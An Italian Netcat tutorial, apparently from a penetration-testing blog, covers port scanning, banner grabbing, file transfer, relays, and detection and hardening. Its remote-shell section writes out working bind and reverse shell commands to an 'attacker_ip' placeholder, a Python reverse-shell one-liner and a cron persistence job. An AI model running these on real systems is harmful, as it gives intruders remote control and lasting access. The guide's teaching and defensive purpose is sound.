---
title: 'Netcat Linux: Comandi, Port Scanning e Network Testing'
slug: netcat
description: 'Netcat (nc) su Linux: scopri i principali comandi per TCP/UDP, port scanning, banner grabbing, listener,exploit e backdoor trasferimento file e network testing.'
image: /netcat.webp
draft: false
date: 2026-01-22T00:00:00.000Z
categories:
  - tools
subcategories:
  - recon
tags:
  - netcat
  - nc
---

# Netcat: Guida Pratica a Comandi, Port Scanning e Trasferimento File

Netcat è lo strumento da riga di comando più usato per leggere e scrivere dati su connessioni TCP e UDP. In questa guida trovi i comandi netcat essenziali: come aprire un listener, scansionare porte, fare banner grabbing, trasferire file e ottenere una reverse shell, con le differenze tra le varianti (Traditional, OpenBSD, Ncat) che cambiano la sintassi da un sistema all'altro.

## Cos'è Netcat

Netcat è un'utility che opera come client e server per connessioni TCP/UDP. Creato da Hobbit nel 1995, oggi esiste in diverse varianti — la più diffusa è Ncat, parte della suite Nmap. La caratteristica distintiva è poter operare sia in modalità client che server, permettendo comunicazioni dirette tra macchine senza protocolli complessi.

**Funzionalità principali:**

* Listener su porte specifiche
* Connessione a servizi remoti
* Trasferimento bidirezionale di dati
* Port scanning e banner grabbing
* Tunneling e port forwarding
* Bind/reverse shell

## Installazione e Varianti

Verifica se è già presente sul sistema:

```bash
nc -h
netcat -h
ncat -h
```

**Debian/Ubuntu:**

```bash
sudo apt install netcat-traditional
# oppure
sudo apt install netcat-openbsd
```

**RHEL/CentOS/Fedora:**

```bash
sudo yum install nc
# oppure Ncat (versione Nmap)
sudo yum install nmap-ncat
```

**Windows:** non è incluso nativamente. Va scaricato Ncat dalla suite [Nmap](https://hackita.it/articoli/nmap/) ufficiale.

### Perché la variante conta

Chi cerca "Netcat" spesso non sa che `nc` si comporta diversamente a seconda dell'implementazione installata — è la causa più comune di comandi che "non funzionano come nella guida":

| Variante           | Caratteristiche                                                                                        | Dove la trovi di default |
| ------------------ | ------------------------------------------------------------------------------------------------------ | ------------------------ |
| Netcat Traditional | Sintassi classica, supporta `-e`                                                                       | Molte distro legacy      |
| Netcat OpenBSD     | Fork più sicuro, `-e` rimosso, sintassi `-l` leggermente diversa (niente `-p` separato: `nc -l porta`) | Debian/Ubuntu moderne    |
| Ncat               | Versione Nmap, supporta SSL, proxy, `--sh-exec` al posto di `-e`                                       | Chi installa Nmap        |

Prima di copiare un comando da qualsiasi guida (compresa questa), verifica con `nc -h` quale variante hai: risparmia mezz'ora di debug.

## Sintassi Base

```bash
nc [opzioni] [host] [porta]
```

Opzioni principali:

```bash
-l          # Modalità listener (server)
-p [porta]  # Porta locale (Traditional/Ncat; su OpenBSD va dopo -l senza -p)
-v / -vv    # Verbose
-n          # Skip DNS resolution
-z          # Zero-I/O mode (scanning)
-u          # UDP invece di TCP
-w [sec]    # Timeout
-e [cmd]    # Esegui comando — non disponibile su OpenBSD di default
```

**Client** — connessione a un servizio remoto:

```bash
nc 192.168.1.100 80
```

**Server** — listener sulla porta 4444:

```bash
nc -l -p 4444
```

## Network Analysis

### Banner Grabbing

Comando: `echo "HEAD / HTTP/1.0\r\n\r\n" | nc target.com 80`
Cosa fa: invia una richiesta HTTP grezza e mostra la risposta del server, header compresi.
Quando usarlo: identificare versione software o configurazione senza tool aggiuntivi.

```bash
# SSH version detection
nc target.com 22

# SMTP server enumeration
nc mail.target.com 25
```

### Port Scanning

Porta singola:

```bash
nc -zv 192.168.1.100 22
```

Range di porte, con timeout ridotto per velocizzare:

```bash
nc -zvw 1 192.168.1.100 1-1000
```

Output tipico:

```
Connection to 192.168.1.100 22 port [tcp/ssh] succeeded!
Connection to 192.168.1.100 80 port [tcp/http] succeeded!
```

Netcat va bene per verifiche puntuali, ma per uno scan completo con service/OS detection e script NSE resta di riferimento **[Nmap](https://hackita.it/articoli/nmap/)**.

### Test Connettività TCP/UDP

```bash
nc -vz google.com 443
```

UDP (serve un listener sull'altro lato, perché UDP non ha handshake):

```bash
# Server
nc -u -l -p 5000
# Client
nc -u server_ip 5000
```

## Trasferimento File

**Ricezione:**

```bash
nc -l -p 3000 > file_ricevuto.zip
```

**Invio:**

```bash
nc 192.168.1.100 3000 < file_da_inviare.zip
```

**Directory intere** (tar impacchetta, non comprime — per comprimere serve `tar czvf`):

```bash
# Server
nc -l -p 3000 | tar xvf -
# Client
tar cvf - /percorso/directory | nc 192.168.1.100 3000
```

Netcat non offre autenticazione, integrità o cifratura proprie: usalo solo su reti fidate o come step temporaneo, mai per dati sensibili su rete non controllata (per quello meglio SSH/SCP).

**Verifica integrità** dopo il trasferimento — usa SHA-256, non MD5:

```bash
sha256sum file_originale.zip
sha256sum file_ricevuto.zip
```

## Chat e Relay

**Chat semplice:**

```bash
# Host A
nc -l -p 5555
# Host B
nc host_a_ip 5555
```

**Relay/port forwarding:**

```bash
nc -l -p 8080 | nc remote_server 80
```

Utile per test rapidi, ma per un tunneling vero e proprio (SOCKS, più porte, resilienza) uno strumento dedicato come [chisel](https://hackita.it/articoli/chisel/) è più adatto di un relay netcat fatto a mano.

## Shell Remote

### Bind Shell

Il target espone la shell in ascolto — richiede che il target sia raggiungibile direttamente (niente NAT/firewall in mezzo).

```bash
# Target
nc -l -p 4444 -e /bin/bash
# Attacker
nc target_ip 4444
```

### Reverse Shell

Il target si connette verso l'attacker — funziona meglio della bind shell quando ci sono NAT o regole outbound permissive, ma non è un modo garantito per bypassare un firewall ben configurato: se le regole outbound bloccano la porta o ispezionano il traffico, la connessione non parte comunque.

```bash
# Attacker
nc -l -p 4444
# Target
nc attacker_ip 4444 -e /bin/bash
```

### Senza Flag -e

Su Netcat OpenBSD e molte distro moderne `-e` non c'è. Alternative:

**Named pipe:**

```bash
rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc attacker_ip 4444 > /tmp/f
```

**Python one-liner:**

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

Altre one-liner in PHP, Perl, Ruby, Java sono raccolte nella storica [reverse shell cheat sheet di PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

Dopo l'accesso iniziale, il passo successivo è post-exploitation e lateral movement — territorio di **[Metasploit](https://hackita.it/articoli/metasploit/)**.

### Persistenza e Upgrade Shell

[Cron job](https://hackita.it/articoli/crontab/) (solo in lab autorizzati — è un IoC facilmente rilevabile):

```bash
*/5 * * * * nc attacker_ip 4444 -e /bin/bash
```

Upgrade a shell interattiva dopo la connessione:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

## Edge Case e Troubleshooting

**Connessione rifiutata — verifica firewall:**

```bash
# Linux
sudo iptables -L -n
# Windows
netsh advfirewall show allprofiles
```

**Timeout:**

```bash
nc -w 30 target_ip port
```

**File corrotto in trasferimento** — Netcat trasferisce già in binario per default; se noti corruzione, controlla che non ci sia conversione CRLF/LF di mezzo (es. terminale Windows) piuttosto che aggiungere flag inesistenti.

## Detection e Hardening

**Connessioni attive:**

```bash
netstat -antp | grep nc
lsof -i -P -n | grep LISTEN
```

Per capire cosa sta passando davvero su quella connessione (payload, pattern, riuso della stessa porta), la cattura con [Wireshark](https://hackita.it/articoli/wireshark/) resta il passo successivo naturale rispetto al solo controllo dei processi attivi.

**Indicatori di compromissione:**

* Listener su porte non standard (4444, 1337, 31337)
* Processi netcat con opzione `-e`
* Connessioni outbound verso IP esterni sospetti
* Named pipe in `/tmp` associati a netcat
* Cron job con comandi netcat

**Mitigazioni:**

```bash
# Rimuovi l'eseguibile se non serve
sudo apt remove netcat-traditional netcat-openbsd

# Blocca porte comuni per reverse shell in uscita
sudo iptables -A OUTPUT -p tcp --dport 4444 -j DROP

# Audit sull'esecuzione del binario
sudo auditctl -w /usr/bin/nc -p x -k netcat_execution
```

## Tabella Comandi Essenziali

| Obiettivo                 | Comando                         | Protocollo |
| ------------------------- | ------------------------------- | ---------- |
| Port scan singolo         | `nc -zv target 80`              | TCP        |
| Port scan range           | `nc -zv target 1-100`           | TCP        |
| Banner grabbing           | `nc target 22`                  | TCP        |
| File transfer (ricezione) | `nc -l -p 3000 > file`          | TCP        |
| File transfer (invio)     | `nc target 3000 < file`         | TCP        |
| Bind shell                | `nc -l -p 4444 -e /bin/bash`    | TCP        |
| Reverse shell             | `nc attacker 4444 -e /bin/bash` | TCP        |
| Chat                      | `nc -l -p 5555`                 | TCP        |
| UDP listener              | `nc -u -l -p 5000`              | UDP        |

## Checklist Pre-Uso

* Autorizzazione scritta per il testing
* Scope e obiettivi documentati
* Ambiente isolato/lab per i primi test
* Regole firewall verificate prima di aprire listener
* Timeout impostati per evitare connessioni zombie
* Cleanup post-attività: chiudi listener, rimuovi eventuali cron job

## FAQ

**Come verifico se Netcat è installato?**
`nc -h`, `netcat -h` o `ncat -h` — se uno risponde, è presente.

**Qual è la differenza tra Netcat e Ncat?**
Ncat è la versione moderna della suite Nmap: supporta SSL, proxy e broker mode che Netcat classico non ha.

**Come apro un listener con Netcat?**
`nc -l -p 4444` (Traditional/Ncat) o `nc -l 4444` (OpenBSD, senza `-p`).

**Come testo se una porta è aperta?**
`nc -zv target porta` — modalità zero-I/O, non invia dati.

**Netcat supporta HTTPS?**
No in forma nativa: serve Ncat con `--ssl`, oppure un tunnel OpenSSL davanti a netcat.

**Perché il flag -e non funziona?**
Molte distro (OpenBSD netcat) lo rimuovono per sicurezza. Alternative: named pipe bash, oppure Ncat con `--sh-exec`.

**Netcat può trasferire file?**
Sì, in entrambe le direzioni e anche directory intere via pipe con `tar`, ma senza cifratura né verifica di integrità integrata — quella va fatta a parte.

**Netcat è legale da usare?**
Lo strumento è legale. Usarlo su sistemi che non possiedi o senza consenso esplicito è reato.
